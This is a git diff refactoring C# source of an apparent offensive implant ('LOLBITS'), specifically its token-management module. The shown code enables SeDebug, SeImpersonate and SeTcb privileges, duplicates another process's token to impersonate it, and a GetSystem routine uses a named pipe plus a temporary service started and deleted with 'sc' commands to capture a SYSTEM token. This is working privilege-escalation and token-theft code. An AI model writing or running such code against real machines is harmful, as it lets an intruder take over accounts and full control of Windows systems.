@@ -16,7 +16,6 @@ namespace LOLBITS.TokenManagement
         private const int NumThreads = 1;
         private readonly SysCallManager sysCall;
 
-
         public TokenManager(SysCallManager sysCall)
         {
             Token = IntPtr.Zero;
@@ -32,35 +31,36 @@ namespace LOLBITS.TokenManagement
 
         public bool Impersonate (int pid)
         {
-            IntPtr phandle = IntPtr.Zero;
-            IntPtr ptoken = IntPtr.Zero;
-            IntPtr imptoken = IntPtr.Zero;
-
-            List<string> l = new List<string>();
-            l.Add("SeDebugPrivilege");
-            l.Add("SeImpersonatePrivilege");
-            l.Add("SeTcbPrivilege");
-            l.Add("SeAssignPrimaryTokenPrivilege");
-            l.Add("SeIncreaseQuotaPrivilege");
-
+            List<string> privileges = new List<string>
+            {
+                "SeDebugPrivilege",
+                "SeImpersonatePrivilege",
+                "SeTcbPrivilege",
+                "SeAssignPrimaryTokenPrivilege",
+                "SeIncreaseQuotaPrivilege"
+            };
+            
             try
             {
-                IntPtr token = IntPtr.Zero;
-                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, sysCall);
-                
-                Utils.EnablePrivileges(token, l);
+                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges,
+                    out var token, sysCall);
 
-                Utils.GetProcessHandle(pid, out phandle, Utils.ProcessAccessFlags.QueryInformation);
+                Utils.EnablePrivileges(token, privileges);
 
-                Utils.GetProcessToken(phandle, Utils.TokenAccessFlags.TokenDuplicate, out ptoken, sysCall);
+                Utils.GetProcessHandle(pid, out var handlePointer, Utils.ProcessAccessFlags.QueryInformation);
 
-                Utils.CloseHandle(phandle);
+                Utils.GetProcessToken(handlePointer, Utils.TokenAccessFlags.TokenDuplicate, out var tokenPointer,
+                    sysCall);
 
-                Utils.TokenAccessFlags tokenAccess = Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
-                   Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
-                   Utils.TokenAccessFlags.TokenAdjustSessionId;
+                Utils.CloseHandle(handlePointer);
 
-                Utils.DuplicateToken(ptoken, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation, Utils.TokenType.TokenPrimary, out imptoken);
+                Utils.TokenAccessFlags tokenAccess =
+                    Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
+                    Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
+                    Utils.TokenAccessFlags.TokenAdjustSessionId;
+
+                Utils.DuplicateToken(tokenPointer, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation,
+                    Utils.TokenType.TokenPrimary, out var imptoken);
 
                 Utils.StartupInfo startupInfo = new Utils.StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -70,27 +70,25 @@ namespace LOLBITS.TokenManagement
 
                 Utils.ProcessInformation processInfo = new Utils.ProcessInformation();
 
-
                 if (Method == 0)
                     Utils.DetermineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);
 
                 if (Method != 0)
                 {
-
                     Token = imptoken;
                     return true;
                 }
+            }
+            catch
+            {
 
-
-            } catch {}
+            }
 
             return false;
-
         }
 
         public static bool GetSystem()
         {
-
             _pipeName = Jobs.RandomString(7);
             bool exit = false;
             Thread server = new Thread(ServerThread);
@@ -104,23 +102,17 @@ namespace LOLBITS.TokenManagement
             cmd = "sc start NewDefaultService2";
             Utils.ExecuteCommand(cmd);
 
-
-
             while (!exit)
             {
-
                 if (server.Join(250))
-                    exit = true;              
-                
+                    exit = true;
             }
 
             if (Token != IntPtr.Zero)           
-                return true;          
-            else
-            {
-                cmd = "sc delete NewDefaultService2";
-                Utils.ExecuteCommand(cmd);
-            }
+                return true;
+
+            cmd = "sc delete NewDefaultService2";
+            Utils.ExecuteCommand(cmd);
 
             return false;
         }
@@ -129,7 +121,6 @@ namespace LOLBITS.TokenManagement
         {
             NamedPipeServerStream pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
             int threadId = Thread.CurrentThread.ManagedThreadId;
-
 
             // Wait for a client to connect
             pipeServer.WaitForConnection();
@@ -149,13 +140,14 @@ namespace LOLBITS.TokenManagement
                 // Catch the IOException that is raised if the pipe is broken
                 // or disconnected.
             }
-            catch{}
+            catch
+            {
+
+            }
             finally
             {
                 pipeServer.Close();
-
             }
-
         }
 
         public static bool RunAs(string domain, string user, string password)
